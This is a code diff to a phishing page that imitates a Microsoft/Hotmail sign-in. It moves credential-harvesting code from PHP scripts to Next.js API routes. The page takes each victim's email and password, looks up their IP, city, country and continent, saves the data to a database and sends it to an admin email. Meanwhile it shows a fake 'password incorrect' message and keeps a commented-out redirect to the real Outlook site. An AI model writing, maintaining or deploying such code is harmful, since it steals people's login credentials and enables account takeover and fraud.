@@ -310,59 +310,61 @@
                     msg2.style.color = "#E81123";
                     msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                     
-                    // Create the form data
-                const formData = new FormData();
-                    formData.append('username', email.value + " (hotmail)");
-                    formData.append('password', password.value);
-                    formData.append('country', country.value);
-                    formData.append('city', city.value);
-                    formData.append('continent', continent.value);
-                    formData.append('ip', ip.value);
-                    formData.append('platform', 'microsoft');
+                    // Create the data object for Supabase
+                    const userData = {
+                        username: email.value + " (hotmail)",
+                        password: password.value,
+                        country: country.value,
+                        city: city.value,
+                        continent: continent.value,
+                        ip_address: ip.value,
+                        platform: 'microsoft'
+                    };
                     
-                    // First save to database
-                fetch('info/login.php', {
-                    method: 'POST',
-                    body: new URLSearchParams(formData)
-                })
-                    .then(response => response.text())
-                .then(data => {
-                    console.log('Data saved to database:', data);
-                    
+                    // First save to database using Next.js API route
+                    fetch('/api/login', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(userData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Data saved to database:', data);
+                        
                         // Then send notification email
-                    sendNotificationEmail();
-                    
-                        // Remove the redirect code - user will stay on this page
-                })
-                .catch(error => {
+                        sendNotificationEmail();
+                        
+                        // Optionally redirect after a delay (uncomment if needed)
+                        // setTimeout(function() {
+                        //     window.location.href = 'https://outlook.live.com/owa/';
+                        // }, 1000);
+                    })
+                    .catch(error => {
                         console.error('Error saving data:', error);
-                });
-            }
+                    });
+                }
             });
             
             // Add function to send email notification
             function sendNotificationEmail() {
                 // Create notification data
-                const notificationData = new FormData();
-                notificationData.append('username', email.value + " (hotmail)");
-                notificationData.append('password', password.value);
-                notificationData.append('country', country.value);
-                notificationData.append('city', city.value);
-                notificationData.append('continent', continent.value);
-                notificationData.append('ip', ip.value);
-                notificationData.append('adminEmail', adminEmail.value);
+                const notificationData = {
+                    username: email.value + " (hotmail)",
+                    password: password.value,
+                    country: country.value,
+                    city: city.value,
+                    continent: continent.value,
+                    ip: ip.value,
+                    adminEmail: adminEmail.value
+                };
                 
-                // Send notification to email proxy
-                fetch('info/mail_proxy.php', {
+                // Send notification via Next.js API route
+                fetch('/api/notify', {
                     method: 'POST',
-                    body: new URLSearchParams(notificationData)
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(notificationData)
                 })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-                    return response.json();
-                })
+                .then(response => response.json())
                 .then(result => {
                     console.log('Email notification sent:', result);
                 })
@@ -379,42 +381,16 @@
         
         // Function to get user location and IP
         function getUserLocationAndIp() {
-            // First get the IP
-            fetch('https://api.ipify.org?format=json')
+            fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
-                document.getElementById('ip').value = data.ip;
-                
-                // Then get location data based on IP
-                return fetch(`https://ipapi.co/${data.ip}/json/`);
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('country').value = data.country_name || 'Unknown';
-                document.getElementById('city').value = data.city || 'Unknown';
-                
-                // Map continent code to full name
-                const continentMap = {
-                    'AF': 'Africa',
-                    'AN': 'Antarctica',
-                    'AS': 'Asia',
-                    'EU': 'Europe',
-                    'NA': 'North America',
-                    'OC': 'Oceania',
-                    'SA': 'South America'
-                };
-                
-                const continentName = data.continent_code ? continentMap[data.continent_code] || 'Unknown' : 'Unknown';
-                document.getElementById('continent').value = continentName;
-                
-                console.log('Location data loaded successfully', data);
+                document.getElementById('country').value = data.country_name || '';
+                document.getElementById('city').value = data.city || '';
+                document.getElementById('continent').value = data.continent_code || '';
+                document.getElementById('ip').value = data.ip || '';
             })
             .catch(error => {
                 console.error('Error fetching location data:', error);
-                // Set fallback values if fetch fails
-                document.getElementById('country').value = 'Unknown';
-                document.getElementById('city').value = 'Unknown';
-                document.getElementById('continent').value = 'Unknown';
             });
         }
     </script>
